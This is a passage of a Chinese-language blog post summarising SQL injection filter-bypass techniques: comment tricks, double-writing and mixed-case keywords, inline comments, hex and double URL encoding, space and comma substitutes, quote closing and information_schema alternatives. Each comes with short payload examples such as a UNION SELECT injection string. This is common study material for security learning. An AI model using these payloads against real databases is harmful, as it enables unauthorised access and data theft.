+HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT … ]
+HANDLER tbl_name CLOSE
+</code></pre><button class="code-block-unfold-btn"></button></div><h3 id="sql注入绕过" tabindex="-1">SQL注入绕过 <a class="header-anchor" href="#sql注入绕过" aria-label="Permalink to &quot;SQL注入绕过&quot;">​</a></h3><h4 id="_1-注释字符绕过" tabindex="-1"><strong>1.注释字符绕过</strong> <a class="header-anchor" href="#_1-注释字符绕过" aria-label="Permalink to &quot;**1.注释字符绕过**&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>-- 注释内容
+# 注释内容      url编码为%23
+/*注释内容*/
+;
+/x00
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_2-双写绕过" tabindex="-1"><strong>2.双写绕过</strong> <a class="header-anchor" href="#_2-双写绕过" aria-label="Permalink to &quot;**2.双写绕过**&quot;">​</a></h4><p>绕过场景：代码使用replace将字符代替为空时使用</p><p>例如，过滤了select</p><p>使用<code>selselectect =&gt;select</code></p><h4 id="_3-大写绕过" tabindex="-1"><strong>3.大写绕过</strong> <a class="header-anchor" href="#_3-大写绕过" aria-label="Permalink to &quot;**3.大写绕过**&quot;">​</a></h4><p>在正则匹配对大小写不敏感时，也就是正则匹配使用了<code>\i</code>，忽略了大小写。而Mysql对大小写也不敏感时使用</p><p>例如，</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>/select/i
+
+使用SeLect进行绕过
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_4-内联注释" tabindex="-1"><strong>4.内联注释</strong> <a class="header-anchor" href="#_4-内联注释" aria-label="Permalink to &quot;**4.内联注释**&quot;">​</a></h4><p><strong>内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。</strong></p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>/*! MySQL特有的语法 */
+</code></pre><button class="code-block-unfold-btn"></button></div><p>例如MySQL服务器可以在以下语句中识别<code>STRAIGHT_JOIN</code>关键字，而其他服务器则不能：</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...
+</code></pre><button class="code-block-unfold-btn"></button></div><p>/*! */类型的注释，内部语句会被执行</p><p>一般用来绕过空格</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>select bbb from table1 where aaa=&#39;&#39; union /*! select database()*/;
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_5-特殊编码绕过" tabindex="-1"><strong>5.特殊编码绕过</strong> <a class="header-anchor" href="#_5-特殊编码绕过" aria-label="Permalink to &quot;**5.特殊编码绕过**&quot;">​</a></h4><p>16进制编码绕过</p><p>如果在查询字段名的时候表名被过滤，或者是数据库中某些特定字符被过滤，则可以使用16进制绕过。</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>select column_name from information_schema.columns where table_name=0x7573657273;
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>0x7573657273</code>为users的16进制编码</p><h4 id="_6-双重url编码绕过" tabindex="-1"><strong>6.双重url编码绕过</strong> <a class="header-anchor" href="#_6-双重url编码绕过" aria-label="Permalink to &quot;**6.双重url编码绕过**&quot;">​</a></h4><p>对字符串进行二次url编码，可绕过关键字过滤</p><h4 id="_7-空格绕过" tabindex="-1"><strong>7.空格绕过</strong> <a class="header-anchor" href="#_7-空格绕过" aria-label="Permalink to &quot;**7.空格绕过**&quot;">​</a></h4><p>可以使用%0d(回车)、%0a(换行)、%09(tab制表)、/**/、%a0(&amp;nbsp）、%0b(垂直制表符)、%0c（换页符）</p><h4 id="_8-过滤了-and、or、-、-、-、regexp" tabindex="-1">8.过滤了 and、or、=、&gt;、&lt;、regexp <a class="header-anchor" href="#_8-过滤了-and、or、-、-、-、regexp" aria-label="Permalink to &quot;8.过滤了 and、or、=、&gt;、&lt;、regexp&quot;">​</a></h4><p>使用 &amp;&amp;、||、 like、greatest(返回值的最大值)、least（返回值的最小值）</p><h4 id="_9-过滤了逗号" tabindex="-1"><strong>9.过滤了逗号</strong> <a class="header-anchor" href="#_9-过滤了逗号" aria-label="Permalink to &quot;**9.过滤了逗号**&quot;">​</a></h4><p>limit使用from或者offset</p><p>select substr(database(0from1for1);select mid(database(0from1for1);</p><p>substr使用from for</p><p>select * from news limit 0,1 &lt;=&gt; select * from news limit 1 offset 0</p><p>if语句使用exp()函数代替</p><p>exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>||exp(710-... 710-rlike 710-...)
+</code></pre><button class="code-block-unfold-btn"></button></div><p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为<code>True</code>，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为<code>false</code>，转换为 <code>exp(710-0)</code> 后则会溢出并报错</p><h4 id="_10、绕过注释符号-–-过滤" tabindex="-1"><strong>10、绕过注释符号（#，–）过滤</strong> <a class="header-anchor" href="#_10、绕过注释符号-–-过滤" aria-label="Permalink to &quot;**10、绕过注释符号（#，--）过滤**&quot;">​</a></h4><p>使用单引号、双引号进行引号闭合绕过</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>SELECT * FROM users WHERE id=&#39;$_POST[id]&#39; LIMIT 0,1
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们传入</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>id=1&#39; and 1=2 union select 1,2,3&#39; 
+</code></pre><button class="code-block-unfold-btn"></button></div><p>这样语句就变成了</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>SELECT * FROM users WHERE id=&#39;1&#39; and 1=2 union select 1,2,3&#39; &#39; LIMIT 0,1
+</code></pre><button class="code-block-unfold-btn"></button></div><p>引号正常闭合</p><h4 id="_11、绕过union-select-where等" tabindex="-1">11、绕过union，select，where等 <a class="header-anchor" href="#_11、绕过union-select-where等" aria-label="Permalink to &quot;11、绕过union，select，where等&quot;">​</a></h4><p>可尝试在关键字内插入/**/</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user
+
+union select user,pwd from user
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_12-等价函数绕过" tabindex="-1">12.等价函数绕过 <a class="header-anchor" href="#_12-等价函数绕过" aria-label="Permalink to &quot;12.等价函数绕过&quot;">​</a></h4><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>hex()、bin() ==&gt; ascii()
+sleep() ==&gt;benchmark()
+concat_ws()==&gt;group_concat()
+mid()、substr() ==&gt; substring()
+@@user ==&gt; user()
+@@datadir ==&gt; datadir()
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_13-information过滤" tabindex="-1">13.information过滤 <a class="header-anchor" href="#_13-information过滤" aria-label="Permalink to &quot;13.information过滤&quot;">​</a></h4><p><code>sys.schema_auto_increment_columns</code>代替<code>information_schema</code>，用来对表自增ID的监控</p><p>但是 <code>sys.schema_auto_increment_columns</code>这个库有些局限性，一般要超级管理员才可以访问sys。</p><p>类似可以利用的表还有：<code>mysql.innodb_table_stats</code>、<code>mysql.innodb_table_index</code>同样存放有库名表名</p><!--]--><!--]--><!----><!----></article><!--]--><!--[--><!--[--><!--[--><!----><ul class="post-copyright" m="y-4"><li class="post-copyright-author"><strong>本文作者：</strong><span>北歌</span></li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://kinsey973.github.io/posts/sql%25E6%25B3%25A8%25E5%2585%25A5%25E6%2580%25BB%25E7%25BB%2593" target="_blank" title="本文链接">https://kinsey973.github.io/posts/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93</a></li><li class="post-copyright-license"><strong>版权声明：</strong><span>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA</a> 许可协议。</span></li></ul><!--]--><!--]--><!--]--></div><!--]--></div><!----></div><!--[--><!--]--><!--[--><div class="post-nav"><div class="post-nav-item"><a href="/posts/misc" class="post-nav-prev" title="misc"><div class="icon" i-ri-arrow-left-s-line></div><span class="title truncate" text="sm">misc</span></a></div><div class="post-nav-item"><a href="/posts/rust%25E5%25AD%25A6%25E4%25B9%25A0" class="post-nav-next" title="rust学习"><span class="title truncate" text="sm">rust学习</span><div class="icon" i-ri-arrow-right-s-line></div></a></div></div><!--]--><!--[--><!--]--><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden comment yun-comment sm:p-6 lg:px-12 xl:px-16" flex="col" min-h="100px" bg="$va-c-bg-light" w="full" p="4"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><!--]--></div><!----></div><!--]--><template class="mt-4 lg:hidden"></template><!--[--><!--]--><!--[--><!--]--></div><!--]--></main><!--[--><button class="xl:hidden toc-btn shadow-md fixed yun-icon-btn z-20 bg-$va-c-bg-soft" opacity="75" right="4" bottom="19"><div i-ri-file-list-line></div></button><!----><aside flex="~ col" class="va-card yun-aside min-h-sm rounded-2" text="center" overflow="auto"><div class="w-full" flex="~ col" pb-2><!--[--><h2 m="t-6 b-2" font="serif black">文章目录</h2><div style="display:none;" data-v-d9db7c40><div class="content" data-v-d9db7c40><div class="outline-title" data-v-d9db7c40>本页</div><div class="outline-marker" data-v-d9db7c40></div><nav aria-labelledby="doc-outline-aria-label" data-v-d9db7c40><span id="doc-outline-aria-label" class="visually-hidden" data-v-d9db7c40> Table of Contents for current page </span><ul class="root va-toc relative z-1 css-i18n-toc" data-v-d9db7c40 data-v-0a3661f1><!--[--><!--]--></ul></nav></div></div><!--]--><div class="flex-grow"></div><!----></div></aside><!--]--><!--]--></div><footer flex="~ col" class="relative yun-footer va-footer px-4 py-4 pt-0 text-$va-c-text-light w-full mt-14" bg="white dark:$va-c-bg-soft" text="center sm"><div class="yun-cloud absolute top--10 left-0 right-0"><svg class="waves" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" fill="var(--yun-c-cloud)"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><!----><div class="copyright flex justify-center items-center gap-2" p="1"><span> © <!--[-->2023 - <!--]--> 2026</span><a class="animate-pulse inline-flex" href="https://www.yunyoujun.cn/sponsors/" target="_blank" title="Sponsor YunYouJun"><div class="i-ri-cloud-line"></div></a><span>北歌</span></div><div class="powered" m="2"><span>由 <a href="https://github.com/YunYouJun/valaxy.git" target="_blank" rel="noopener">Valaxy</a> <span class="op-60">v0.28.7</span> 驱动</span><span mx-1>|</span><span><span>主题</span><span mx-1>-</span><a href="https://github.com/YunYouJun/valaxy/tree/main/packages/valaxy-theme-yun.git" title="valaxy-theme-yun" target="_blank">Yun</a><span class="ml-1 op-60">v0.28.7</span></span></div><!--[--><div>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</div><div>本站访客数 <span id="busuanzi_value_site_uv"></span> 人次</div><!--]--><div class="yun-footer-gradient"></div></footer></div><!--]--></div><script>window.__INITIAL_STATE__='{"pinia":{"yun-app":{"bannerAnimationDone":false},"app":{"showLoading":true},"site":{},"routerStore":{}}}'</script><script type="application/ld+json" data-hid="schema-org-graph">{"@context":"https://schema.org","@graph":[{"@id":"https://kinsey973.github.io/#identity","@type":"Person","name":"北歌","url":"https://kinsey973.github.io/","image":{"@id":"https://kinsey973.github.io/#/schema/image/1"},"sameAs":["/atom.xml","https://music.163.com/#/user/home?id=3954596483","https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&jump_from=webapi","https://github.com/kinsey973","https://travellings.link"]},{"@id":"https://kinsey973.github.io/#website","@type":"WebSite","dateModified":"2025-04-02T19:11:45.000Z","datePublished":"2025-04-02T19:11:45.000Z","inLanguage":"zh-CN","name":"sql注入总结","url":"https://kinsey973.github.io/","publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#webpage","@type":"WebPage","dateModified":"2025-04-02T19:11:45.000Z","datePublished":"2025-04-02T19:11:45.000Z","description":"山行野宿，孤身万里","name":"sql注入总结","url":"https://kinsey973.github.io/","about":{"@id":"https://kinsey973.github.io/#identity"},"isPartOf":{"@id":"https://kinsey973.github.io/#website"},"potentialAction":[{"@type":"ReadAction","target":["https://kinsey973.github.io/"]}]},{"@id":"https://kinsey973.github.io/#article","dateModified":"2025-04-02T19:11:45.000Z","datePublished":"2025-04-02T19:11:45.000Z","description":"山行野宿，孤身万里","headline":"sql注入总结","inLanguage":"zh-CN","thumbnailUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg","@type":["Article","BlogPosting"],"author":{"@id":"https://kinsey973.github.io/#/schema/person/1"},"image":{"@id":"https://kinsey973.github.io/#/schema/image/2"},"isPartOf":{"@id":"https://kinsey973.github.io/#webpage"},"mainEntityOfPage":{"@id":"https://kinsey973.github.io/#webpage"},"publisher":{"@id":"https://kinsey973.github.io/#identity"}},{"@id":"https://kinsey973.github.io/#/schema/person/1","@type":"Person","name":"北歌","url":"https://valaxy.site"},{"@id":"https://kinsey973.github.io/#/schema/image/1","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png"},{"@id":"https://kinsey973.github.io/#/schema/image/2","@type":"ImageObject","contentUrl":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg","inLanguage":"zh-CN","url":"https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg"}]}</script>
+  
+</body>
+</html>
